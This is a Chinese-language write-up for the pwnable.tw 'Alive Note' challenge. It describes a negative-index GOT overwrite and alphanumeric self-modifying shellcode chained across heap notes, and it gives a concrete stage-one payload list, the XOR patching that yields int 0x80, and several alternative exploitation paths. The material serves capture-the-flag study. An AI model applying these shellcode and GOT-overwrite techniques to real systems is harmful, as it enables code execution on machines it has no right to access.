---
tags:
  - heap-buffer-overflow
  - alpha-shellcode
  - got-overwrite
platform: pwnable.tw
points: 350
arch: i386
libc: glibc-2.23
relro: partial
canary: yes
nx: no
pie: no
references:
  - https://pwnable.tw/challenge/
description: "越界索引写入可以覆盖 free 的 GOT 表项，跳转到散布在堆 note 块中的 3 字节字母数字 shellcode 片段链。"
proof-of-concept: no
---

# Alive Note — pwnable.tw (350 分)

[← 返回 pwnable.tw 题目索引](README.md)

> The last 23 days, write down your shellcode.
>
> `nc chall.pwnable.tw 10300`
>
> Flag: `FLAG{Sh3llcoding_in_th3_n0t3_ch4in}`

## 题目概览

一个 32 位 i386 的笔记程序（No PIE、Partial RELRO、栈 Canary、**NX 关闭 / 堆 RWX**）。玩家可以添加、查看、删除存放在 notes 数组中的 "name"。每个 name 由 `strdup()` 分配到堆上（最多 8 字节），且内容必须**仅包含字母数字和空格**。这是 "Death Note" 的升级版 —— 同样通过负索引覆盖 GOT，但字符集限制严格得多。

```bash
checksec:
  Arch:     i386-32-little
  RELRO:    Partial RELRO        # GOT writable
  Stack:    Canary found
  NX:       NX unknown           # GNU_STACK missing
  PIE:      No PIE (0x8048000)
  RWX:      Has RWX segments     # READ_IMPLIES_EXEC → heap is executable
```

`GNU_STACK` 程序头被设为 RWE。在 i386 Linux 上，这会开启 `READ_IMPLIES_EXEC` personality 标志，使**所有可读页（包括堆）都可执行**。这是从堆上的 note 运行 shellcode 的根本前提。

## 漏洞

### V1 — 负索引越界写/读（主要，可利用）

**根因：** 索引边界检查只校验**上界**（`idx > 10`），负索引可以访问 `notes[]` 数组之前的内存。

```c
// Simplified add_note / del_note
read_int();  // reads index via atoi()
if (idx > 10) { puts("Out of bound !!"); exit(0); }
notes[idx] = strdup(name_buf);  // negative idx → write before notes[]
// or
free(notes[idx]);               // negative idx → free arbitrary GOT entry's value
```

**关键偏移：**

```text
notes[]   @ 0x0804a080   (11 slots, index 0..10)
free@GOT  @ 0x0804a014
atoi@GOT  @ 0x0804a034
```

```text
index_free = (0x0804a014 - 0x0804a080) / 4 = -27
index_atoi = (0x0804a034 - 0x0804a080) / 4 = -19
```

**影响：**

- `add_note(-27, shellcode)` → `strdup()` 分配一个包含 shellcode 的堆块，并把该块地址写入 `free@GOT`。
- `delete_note(-27)` → 调用 `free(notes[-27])`，经由 `free@GOT`（现在指向堆块）解析 → **跳进堆上的 shellcode**。
- 入口处 `eax` 保存着被释放块的指针（即 shellcode 基址），这对自己修改代码至关重要。

### V2 — 仅字母数字的内容过滤

**根因：** `add_note` 用 `__ctype_b_loc()` 和 `_ISalnum`（0x08）标志逐字节校验 name。只有 `[0-9A-Za-z ]`（ASCII `0x20`、`0x30-0x39`、`0x41-0x5a`、`0x61-0x7a`）能通过。

```c
// check() — per-byte validation
if (c == ' ') ok;
else if (__ctype_b_loc()[c] & 0x08) ok;  // _ISalnum
else return 0;  // "It must be a alnum name !!" → exit(-1)
```

**影响：** `\xcd\x80`（`int 0x80`）、`\x2f`（`/bin/sh` 中的 `/`）、`\x0b`（`SYS_execve`）等标准 shellcode 字节都被禁止。shellcode 必须完全由字母数字字节构成，需要自修改技术。

### V3 — 8 字节 note 大小限制

每次 `strdup()` 最多复制 8 字节（7 字节有效 + NUL 终止符）。堆分配器的最小块大小是 `0x10`，因此相邻 note 在堆上间隔 `0x10` 字节。shellcode 必须拆成 6 字节片段，再用 2 字节跳转串起来。

## 关键数据结构

### 堆块布局

每次通过 `strdup()` 分配 note 都会创建一个 `0x10` 字节的块：

```text
+0x00: prev_size (4 bytes)
+0x04: size = 0x11 (4 bytes, includes PREV_INUSE bit)
+0x08: user data (up to 8 bytes of alphanumeric shellcode)
```

相邻块位于 `base + N*0x10`。note 之间的 8 字节块头**不是可执行代码**，所以跳转必须跨过它们。

### 跳转串联

每个 8 字节 note 容纳约 6 字节有效 shellcode + 2 字节条件跳转以到达下一个 note：

```text
[6 bytes shellcode] [jne/jno/jae +0x38]
```

常用的跳转操作码（均为字母数字）：

- `\x75\x38` — `jne +0x38`（操作码 `u8`，向前跳 `0x3a` 字节 = 跳过 3 个块头 + 2 字节，到达下一个 note 的代码）
- `\x71\x38` — `jno +0x38`
- `\x73\x38` — `jae +0x38`
- `\x74\x39` — `je +0x39`

跳转条件（`free` 设置或先前 XOR 操作后 ZF=0）保证条件分支总是被采取。

## 利用路径

所有解法都把 V1（负索引覆盖 GOT）和可执行堆上的字母数字 shellcode 结合起来。区别在于 shellcode 的构造策略。

---

### 路径 A — 自修改字母数字 shellcode 链 → `read()` 装载器 → `execve()`（主流）

**使用占比：** 约 90% 的解法（59、278、370、550、583、644、821、1172、1780、2524、3498、5002、7905、8153、14106、17704、25916、36997 及 exp.py）

**策略：** 在多个堆块中写入由条件跳转连接的字母数字 shellcode 片段链。链会自修改，把 `int 0x80`（`\xcd\x80`）修补进下游块，然后执行 `read(0, buf, N)` 拉取不受限制的第二阶段 shellcode（`execve("/bin/sh", 0, 0)`）。

**步骤：**

1. **覆盖 `free@GOT`：** `add_note(-27, stage1_chunk0)` —— `strdup` 出来的块地址覆盖 `free@GOT`。

2. **放置 shellcode 片段：** `add_note(0..N, fragment)` —— 每个片段是 6 字节字母数字机器码 + 2 字节跳转。填充 note（3-4 次空分配）填补有意义块之间的空隙。

3. **触发执行：** `delete_note(-27)` —— 调用 `free(notes[-27])`，跳转到堆上的 chunk0。

4. **Shellcode 链执行：**

   - 设置 `ecx` = 块基址（通过 `push eax; pop ecx` —— `eax` = 被释放指针）
   - 设置 `edx` = 读取长度（例如 `push 0x7a; pop edx`）
   - 修补 `int 0x80`：用计算好的值执行 `xor byte ptr [ecx+offset], al`，把字母数字字节（如 `0x74 0x39`）变换成 `\xcd\x80`
   - 设置 `eax` = 3（`SYS_read`）：通过 `push imm8; pop eax; xor al, imm8`
   - 执行修补后的 `int 0x80` → `read(0, heap_base, 0x7a)`

5. **发送第二阶段：** NOP 滑板（`\x90` 或 `\x41`=`inc ecx`）+ 原始 `execve("/bin/sh", 0, 0)` shellcode。read 会从链基址开始覆盖堆；执行流滑过滑板进入真正的 shellcode。

**示例链（来自 exp.py）：**

```python
STAGE1 = [
    (-27, b"PYjzZSu8"),   # push eax; pop ecx; push 0x7a; pop edx; push ebx; jne
    (0,   b"4F0A5Su8"),   # xor al,0x46; xor [ecx+0x35],al; push ebx; jne
    (1,   b"fuck"),       # spacer (never executed)
    (2,   b"X4340t9"),    # pop eax; xor al,0x33; xor al,0x30; je (patched to int 0x80)
    (3,   b"XH0AFu6"),   # pop eax; dec eax; xor [ecx+0x46],al; jne
    (4,   b"0A60AWua"),   # xor [ecx+0x36],al; xor [ecx+0x57],al; jne
]
```

**修补 `int 0x80`：** 字节 `0x74 0x39`（位于 chunk2 偏移 +5、+6）被原地 XOR：

- `0x74 ^ 0xb9 = 0xCD`，`0x39 ^ 0xb9 = 0x80` → 得到 `\xcd\x80`
- 值 `0xb9` 由对 `0xff`（来自对 0 执行 `dec eax`）执行 `xor al, 0x46` 得到

**第二阶段：** `b"A" * 0x37 + execve_shellcode` —— `A` 字节（`0x41` = `inc ecx`）充当 NOP 滑板，让执行精确落到 `execve` payload 上。

---

### 路径 B — `popad` 构造帧 → 通过内存 XOR 得到 `int 0x80`

**使用解法：** 278、5002、3498

路径 A 的**变体**：利用 `popad`（`0x61`，字母数字！）从精心构造的栈帧一次性批量加载寄存器：

1. 按 `popad` 需要的顺序把寄存器值压栈（EDI、ESI、EBP、ESP、EBX、EDX、ECX、EAX）。
2. 用 `xor [reg+offset], ax/eax` 把 `int 0x80` 修补进内存。
3. 执行 `popad` 一次性设置所有寄存器，然后落入修补好的 `int 0x80`。

这种方法更复杂，但避免了逐个设置寄存器。

---

### 路径 C — 通过 `show_note` 泄露 libc + 覆盖 GOT 调用系统函数

**使用解法：** 100、956

**策略：** 不构造 `read()` 装载器，而是泄露 libc 地址并直接调用 `system()`。

1. **泄露 libc：** `show_note(-N)` 读取 `notes[]` 之前的内存，命中 GOT 表项或其他 libc 指针。解析泄露字节计算 libc 基址。

2. **覆盖 `free@GOT`**，指向一段交换寄存器并跳转到 `system()` 的堆 shellcode。

3. **用精心构造的输入触发：** `delete_note` 通过 `atoi`/`read_int` 技巧传入 `system()` 地址 + `"sh"` 字符串，或由堆上的字母数字 shellcode 设置 `eax = system` 后执行 `call [eax]`。

**缺点：** 更脆弱 —— 依赖特定 libc 偏移和调用时的寄存器状态。

---

### 路径 D — 覆盖 `strlen@GOT` 绕过字母数字检查

**使用解法：** 3148

**策略：** 不写字母数字 shellcode，而是通过覆盖 `strlen@GOT` 让字符过滤器失效。

1. **耗尽堆：** 用大量空 `strdup` 分配直到 wilderness chunk 的 size 字段包含有用的字节序列（如 `\xc3\x41` = `ret; inc ecx`）。

2. **覆盖 `strlen@GOT`**（索引 -22），指向包含 `ret` 的堆地址 —— 让 `strlen()` 总是快速返回，实际上不做校验。

3. **过滤器被绕过**后，把任意（非字母数字）shellcode 字节写进堆 note。

4. **覆盖 `free@GOT`** 或 `atoi@GOT` 为 shellcode 地址，触发执行。

**缺点：** 需要精确的堆布局（数千次分配才能得到正确的 top chunk 大小）。

---

### 路径 E — 通过 `popad` + `xor` 修补直接执行 `execve`（无 read 装载器）

**使用解法：** 5002、25916

**策略：** 完全用字母数字 shellcode 构造整个 `execve("/bin/sh", 0, 0)` 系统调用，不使用 `read()` 装载器。利用 `xor` 把 `/bin/sh` 字符串和 `int 0x80` 修补进内存，再用 `popad` 加载所有寄存器：

1. 通过 `push` + `xor` 逐字节构造 `/bin/sh\x00` 字符串。
2. 通过 XOR 修补构造 `\xcd\x80`。
3. 设置 `eax=0xb`、`ebx=ptr_to_binsh`、`ecx=0`、`edx=0`。
4. 执行修补后的 `int 0x80`。

**缺点：** 需要多得多的 shellcode 块（15-50+），链复杂得多。

## 利用原语总结

| 原语 | 来源 | 可靠性 |
|------|------|--------|
| GOT 覆盖（`free`、`atoi`、`strlen`） | V1：负索引越界 | 确定性 |
| 堆代码执行 | RWX 堆（READ_IMPLIES_EXEC） | 确定性（仅 i386） |
| 自修改 shellcode | XOR 修补 `int 0x80` | 确定性 |
| `read()` 装载器（第一阶段） | 字母数字链 → `read(0, buf, N)` | 确定性 |
| `execve("/bin/sh")`（第二阶段） | 通过 `read()` 写入不受限 shellcode | 确定性 |
| libc 泄露 | 负索引 `show_note` | 确定性 |

## 字母数字指令参考

具有字母数字编码的关键 x86 指令：

| 指令 | 字节 | ASCII |
|------|------|-------|
| `push eax` | `50` | `P` |
| `push ecx` | `51` | `Q` |
| `push edx` | `52` | `R` |
| `push ebx` | `53` | `S` |
| `push esp` | `54` | `T` |
| `push ebp` | `55` | `U` |
| `pop eax` | `58` | `X` |
| `pop ecx` | `59` | `Y` |
| `pop edx` | `5a` | `Z` |
| `push imm8` | `6a xx` | `j` + alnum |
| `inc ecx` | `41` | `A` |
| `inc edx` | `42` | `B` |
| `inc ebx` | `43` | `C` |
| `dec eax` | `48` | `H` |
| `dec ebx` | `4b` | `K` |
| `xor al, imm8` | `34 xx` | `4` + alnum |
| `xor [ecx+off], al` | `30 41 xx` | `0A` + alnum |
| `xor ax, imm16` | `66 35 xx xx` | `f5` + alnum |
| `jne rel8` | `75 xx` | `u` + alnum |
| `jno rel8` | `71 xx` | `q` + alnum |
| `jae rel8` | `73 xx` | `s` + alnum |
| `popad` | `61` | `a` |

## 题解文章

| 文件 | 主要路径 | 关键技术 | 备注 |
|------|----------|----------|------|
| `59.md` | A | `jno` 链、XOR 自修改、NASM 注释 | 附带完整汇编源码 |
| `100.md` | C | 通过 show 泄露 libc、交换寄存器调用 system() | 无 read 装载器 —— 直接系统调用 |
| `185.md` | A | `popad` + `xor word [edx+eax*2+0x38],cx` | 使用带计算偏移的寻址模式 |
| `278.md` | B | `popad` 帧 + XOR 修补 int 0x80 | Ruby 利用脚本 |
| `370.md` | A | 极简 —— "和 Death Note 一样，只是跳转" | 两行说明 |
| `550.md` | A | 基于 `popad` 的精细寄存器链 | 用负索引做间隔 |
| `583.md` | A | XOR `[ecx+off]` 修补 `int 0x80` | 干净的 Python 脚本 |
| `644.md` | A | 7 段链、`jae` 跳转 | 各阶段文档详尽 |
| `821.md` | A | `xor [ecx+0x31]` 修补、`jne` | 汇编 + 利用脚本 |
| `956.md` | C | 覆盖 `atoi@GOT`、泄露 libc、execve | 堆耗尽方案 |
| `1172.md` | A | `PYjAXGq8` 链、5 个 note | 最小链 |
| `1780.md` | A | `jno 0x40` 跳转、`xor byte` 修补 | 阶段划分清晰 |
| `2524.md` | A | `jae` 跳转、9 个阶段 | 用 `inc edx` 递增系统调用号 |
| `3148.md` | D | 绕过 `strlen@GOT`、堆耗尽 | 完全绕过字母数字检查 |
| `3498.md` | A | 枚举合法字节、`popad` + XOR | 最完整的合法字节分析 |
| `5002.md` | E | 完整 `popad` 帧、无 read 装载器 | 原地构造 `int 0x80` + `/bin/sh` |
| `7905.md` | A | 附带 Unicorn 验证的详细题解 | 文档最完善 |
| `8153.md` | A | 中文题解，解释 XOR 修补 | 逐步的寄存器/内存跟踪 |
| `14106.md` | A | 极简 `jne 0x48` 链 | 策略描述简洁 |
| `17704.md` | A | `jno 0x39` 链、9 个片段 | 使用 `dec edx; push edx; pop eax` |
| `25916.md` | A | `jno` 链、大量 XOR 修补 | 扩展链，XOR 阶段分离 |
| `36997.md` | A | `jne` 链、`pop ecx` 装载器 | 引用外部题解辅助学习 |

## 文件

| 文件 | 说明 |
|------|------|
| `exp.py` | 可用利用脚本（自包含，不依赖 pwntools） |
| `desc.txt` | 题目描述 |
| `artifacts/alive_note` | 原始题目二进制（i386，未 strip） |
| `solution/*.md` | 社区题解（87 份） |
